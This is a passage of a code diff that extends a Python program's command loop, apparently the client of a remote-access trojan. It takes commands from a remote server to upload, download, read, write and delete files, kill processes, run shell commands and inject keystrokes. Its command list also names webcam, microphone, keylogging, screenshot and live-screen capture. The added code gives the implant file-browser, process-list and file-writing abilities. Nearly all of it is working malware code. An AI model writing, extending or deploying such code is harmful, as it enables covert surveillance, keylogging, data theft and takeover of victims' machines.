+                                        k.release(key_obj)
+                                else:
+                                    k.press(key_name)
+                                    k.release(key_name)
+                        except Exception:
+                            pass
                         continue
                     
                     elif cmd.startswith("DOWNLOAD:"):
@@ -783,9 +1406,11 @@ def main_loop():
                     
                     elif cmd.startswith("UPLOAD:"):
                         try:
-                            parts = cmd.split(":", 2)
-                            filename = parts[1].strip()
-                            data_b64 = parts[2]
+                            # Split base64 data from the right to handle paths with colons
+                            cmd_str = cmd
+                            data_b64 = cmd_str.split(":")[-1]
+                            # Path is everything between UPLOAD: and the last colon
+                            filename = cmd_str[7:-(len(data_b64)+1)].strip()
                             output = upload_file(filename, data_b64).encode()
                         except Exception as e:
                             output = json.dumps({"type": "UPLOAD", "status": "error", "message": str(e)}).encode()
@@ -801,6 +1426,35 @@ def main_loop():
                             "current_dir": os.getcwd()
                         }
                         output = json.dumps(info, indent=2).encode()
+
+                    elif cmd == "PROCESS_LIST":
+                        output = get_process_list().encode()
+
+                    elif cmd == "SYSTEM_METRICS":
+                        output = get_system_metrics().encode()
+
+                    elif cmd.startswith("FILE_BROWSER:"):
+                        target_path = cmd.split(":", 1)[1].strip()
+                        output = list_directory_contents(target_path).encode()
+
+                    elif cmd.startswith("DELETE_FILE:"):
+                        target_path = cmd.split(":", 1)[1].strip()
+                        output = delete_remote_file(target_path).encode()
+
+                    elif cmd.startswith("READ_TEXT_FILE:"):
+                        target_path = cmd.split(":", 1)[1].strip()
+                        output = read_text_file(target_path).encode()
+
+                    elif cmd.startswith("WRITE_TEXT_FILE:"):
+                        try:
+                            payload = cmd.split(":", 1)[1].strip()
+                            parts = payload.rsplit("|", 2)
+                            target_path = parts[0].strip()
+                            encoding = parts[1].strip()
+                            content_b64 = parts[2]
+                            output = write_text_file(target_path, encoding, content_b64).encode()
+                        except Exception as e:
+                            output = json.dumps({"type": "WRITE_TEXT_FILE", "status": "error", "message": f"Malformed command: {str(e)}"}).encode()
                     
                     elif cmd.strip().startswith("cd"):
                         path = cmd.strip()[2:].strip()
@@ -860,10 +1514,13 @@ def main_loop():
                         output = result.stdout if result.stdout else result.stderr
                     
                     elif cmd.startswith("KILL_PROCESS:"):
-                        name = cmd.split(":", 1)[1].strip()
-                        cmd_str = get_command("kill_process") + " " + name
-                        result = subprocess.run(cmd_str, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=5)
-                        output = result.stdout if result.stdout else result.stderr
+                        target = cmd.split(":", 1)[1].strip()
+                        if target.isdigit():
+                            output = kill_process_by_pid(target).encode()
+                        else:
+                            cmd_str = get_command("kill_process") + " " + target
+                            result = subprocess.run(cmd_str, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=5)
+                            output = result.stdout if result.stdout else result.stderr
                     
                     else:
                         # Command aliases for cross-platform compatibility
@@ -1053,12 +1710,14 @@ def main_loop():
                             else:
                                 output = error_msg.encode()
 
-                    client.send(output)
+                    with client_lock:
+                        client.send(output)
                     
-                    if not cmd.upper().startswith(("SCREENSHOT", "DOWNLOAD:", "UPLOAD:", "SYSINFO", "POPUP:", "WEBCAM", "MICROPHONE", "KEYLOG_START", "KEYLOG_STOP", "MIC_STOP")):
+                    if not cmd.upper().startswith(("SCREENSHOT", "DOWNLOAD:", "UPLOAD:", "SYSINFO", "POPUP:", "WEBCAM", "MICROPHONE", "KEYLOG_START", "KEYLOG_STOP", "MIC_STOP", "PROCESS_LIST", "SYSTEM_METRICS", "KILL_PROCESS:", "FILE_BROWSER:", "DELETE_FILE:", "READ_TEXT_FILE:", "WRITE_TEXT_FILE:", "LIVE_SCREEN", "LIVE_SCREEN_STOP")):
                         try:
                             time.sleep(0.1)
-                            client.send(b"\n}")
+                            with client_lock:
+                                client.send(b"\n}")
                         except:
                             pass
 
@@ -1089,4 +1748,11 @@ def main_loop():
             time.sleep(5)
 
 if __name__ == "__main__":
+    if len(sys.argv) > 1 and sys.argv[1] == "--popup":
+        style = sys.argv[2] if len(sys.argv) > 2 else "CYBER"
+        title = sys.argv[3] if len(sys.argv) > 3 else "Alert"
+        message = sys.argv[4] if len(sys.argv) > 4 else ""
+        show_selected_popup(style, title, message)
+        sys.exit(0)
+        
     main_loop()
